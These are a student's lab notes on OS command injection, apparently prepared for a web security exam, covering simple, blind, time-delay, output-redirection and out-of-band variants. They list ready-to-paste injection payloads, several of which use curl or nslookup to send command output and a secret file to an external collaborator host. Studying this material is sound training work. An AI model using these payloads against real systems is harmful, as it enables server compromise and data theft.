## Stage 3
### What is it?
Aka shell injection. It allows an attacker to execute operating system (OS) commands on the server. 
### Use these to Identify OS Command Injections
```
|whoami
;whoami
; sleep 5
| ping -c 5 exploit.net
ls

# example
||ping+-c+10+127.0.0.1||
```

### Use Burp Scanner to find 
![[OS Command Injection-20260118163612191.png]]
![[OS Command Injection-20260118163548858.png]]

*Intruder > add positions to all params*
![[OS Command Injection-20260118164231547.png]]
### How to identify
Check stock or Submit feedback

If `|` or `||` doesn't work, try others in the list:
```
 &&
 &
 ||
 |
 ;
 `
 '
 "
 0x0a
 \n
```

Identify blind OS command injection
```
email=carlos@exam.net||curl+`whoami`.OASTIFY.COM||

email=||curl+oastify.com?c=`whoami`||
```

Retrieve the secret
```
||$(curl $(cat /home/carlos/secret).OASTIFY.COM)||
```

### Identify Vulnerabilities in Exam

- `||ping+-c+5+127.0.0.1||` 
	- takes ~5secs from response
		- [[OS Command Injection#3.2. Lab Blind OS command injection with time delays ⭕️]]
		- [[OS Command Injection#3.3. Lab Blind OS command injection with output redirection ⭕️]]
	- immediate response
		- [[OS Command Injection#3.4. Lab Blind OS command injection with out-of-band interaction ⭕️]]
		- [[OS Command Injection#3.5. Lab Blind OS command injection with out-of-band data exfiltration ⭕️]]


Check stock
`|whoami` == 200 OK
```
# payloads that worked
productId=2&storeId=|curl+8irzw52rmo1v1tbmg7acd469d0j273vs.oastify.com?c=`cat+/home/carlos/secret`

productId=2&storeId=|curl+`cat+/home/carlos/secret`.8irzw52rmo1v1tbmg7acd469d0j273vs.oastify.com
```
- [[OS Command Injection#3.1. Lab OS command injection, simple case ⭕️]]

Target scan submit feedback or any `POST` request 
- `||ping+-c+5+127.0.0.1||` 
	- takes ~5secs from response
		- [[OS Command Injection#3.2. Lab Blind OS command injection with time delays ⭕️]]
		- [[OS Command Injection#3.3. Lab Blind OS command injection with output redirection ⭕️]]
	- immediate response
		- [[OS Command Injection#3.4. Lab Blind OS command injection with out-of-band interaction ⭕️]]

---
#### 3.1. Lab: OS command injection, simple case ⭕️
This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the `whoami` command to determine the name of the current user.
1. Select and item, click check stock, send `POST /product/stock` to Repeater. 
2. Append `|whoami` to `storeId=1` to solve.
	1. ![[OS Command Injection-20260118163139774.png]]
>[!tip] How to Identify this Vulnerability?
>1. `POST` request with a feature to get a response from the server e.g., check stock
>2. Use Burp scan insertion point

**Use this for exam**
```
# payloads that worked
productId=2&storeId=|curl+8irzw52rmo1v1tbmg7acd469d0j273vs.oastify.com?c=`cat+/home/carlos/secret`

productId=2&storeId=|curl+`cat+/home/carlos/secret`.8irzw52rmo1v1tbmg7acd469d0j273vs.oastify.com
```

---
#### 3.2. Lab: Blind OS command injection with time delays ⭕️
This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.
1. Fill out the Submit Feedback feature and send the `POST /feedback/submit` request to Repeater.
2. Identifying the vulnerable parameter:
	1. Send the `POST` request to Repeater > add positions to the value of each parameter
		1. ![[OS Command Injection-20260118164231547.png]]
	2. Right click > scan insertion points. After a bit, the scanner will find the vulnerable parameter. *Just running the scan actually solved the lab*
		1. ![[OS Command Injection-20260118164124659.png]]
3. If it doesn't solve automatically, now that we know the `email` param is vulnerable, go back to Repeater, change the param to `email=x||ping+-c+10+127.0.0.1||`, Send and it should solve. Notice the response took around 10 seconds to get back.
	1. ![[OS Command Injection-20260118164442447.png]]

#ExamTip Use this command to execute a command and send what we want to burp collaborator. In the exam, we'd want to exfiltrate the secret file. Since this a blind os command injection vulnerability, we see the results of the command(s) from the response.
```
email=carlos@exam.net||curl+`whoami`.OASTIFY.COM||
```
![[OS Command Injection-20260118164726905.png]]
![[OS Command Injection-20260118164759039.png]]
>[!tip] How to Identify this Vulnerability?
>1. `POST` request with a feature to get a response from the server e.g., check stock
>2. Use Burp scan insertion point


**Use in exam**
```
# Any of these should work
email=carlos@exam.net||curl+`cat+/home/carlos/secret`.053rjxpj9gonolye3zx40wt10s6uuwil.oastify.com||

email=carlos@exam.net||curl+053rjxpj9gonolye3zx40wt10s6uuwil.oastify.com?c=`cat+/home/carlos/secret`||

email=carlos@exam.net||$(curl+$(cat+/home/carlos/secret).053rjxpj9gonolye3zx40wt10s6uuwil.oastify.com)||
```

---
#### 3.3. Lab: Blind OS command injection with output redirection ⭕️
This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

`/var/www/images/`

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the `whoami` command and retrieve the output.
1. Fill out the Submit Feedback feature and send the `POST /feedback/submit` request to Repeater.
2. Follow Step 2 of the previous lab to use burp scanner to find the vulnerable param: `email`.
	1. ![[OS Command Injection-20260118165556840.png]]
3. Run the `whoami` command via `email` param and save the results in `output.txt` within the writable `/var/www/images/` directory: `email=||whoami>/var/www/images/output.txt||`. You might see a 500 error and that's ok. Lab solved.
	1. ![[OS Command Injection-20260118165851548.png]]
4. Go to HTTP History and grab the `GET` request that retrieve image files and send to Repeater. Change `72.jpg` to `output.txt`. 
	1. ![[OS Command Injection-20260118165941687.png]]
	2. ![[OS Command Injection-20260118170025447.png]]

>_**Identify**_ the working directory using `pwd` command output redirected, and appending to `output.txt` file every bash command stdout.
```
||pwd>output.txt||
||echo>>output.txt||
||cat+/etc/hosts>>/var/www/images/output.txt||
||echo>>output.txt||
||ls+-al>>/var/www/images/output.txt||
||echo>>output.txt||
||whoami>>/var/www/images/output.txt||
```

>[!tip] How to Identify this Vulnerability?
>1. `POST` request with a feature to get a response from the server e.g., check stock
>2. Use Burp scan insertion point

**Use in exam**
```
# run the commmands one by one
# echo adds a new line to output.txt for the next command
||pwd>output.txt||
||echo>>output.txt||
||ls+-al>>/var/www/images/output.txt||
||echo>>output.txt||

||cat+/home/carlos/secret>output.txt||

# Use this request to see the contents of output.txt
GET /image?filename=output.txt
```

---
#### 3.4. Lab: Blind OS command injection with out-of-band interaction ⭕️
This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.
1. Complete Submit feedback form > send `POST` request to Repeater. Using Burp scanner, we know `email` is vulnerable. Append the payload below to the email param and solve.
```
||curl+`whoami`.OASTIFY.COM||
```
![[OS Command Injection-20260118170741559.png]]
![[OS Command Injection-20260118170806393.png]]

#ExamTip For the exam, use the following payload to get the secret file.
```
email=carlos@exam.net||curl+`cat+/home/carlos/secret`.OASTIFY.COM||

# this only receive a DNS query but will have the output in there
email=carlos@exam.net||nslookup+`cat+/home/carlos/secret`.OASTIFY.COM||
```

---
#### 3.5. Lab: Blind OS command injection with out-of-band data exfiltration ⭕️
This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.
1. Submit feedback, send `POST` to Repeater > email param is vulnerable using burp scanner. 
2. Enter the following payload in `email` and Send.
```
email=aaa@aaa.com||nslookup+`whoami`.OASTIFY.COM||
```
![[OS Command Injection-20260118171205290.png]]
3. Poll burp collaborator and see a DNS request along with the machine's username. Submit and solve.
	1. ![[OS Command Injection-20260118171336801.png]]

**Use the same payloads from the previous lab**

---





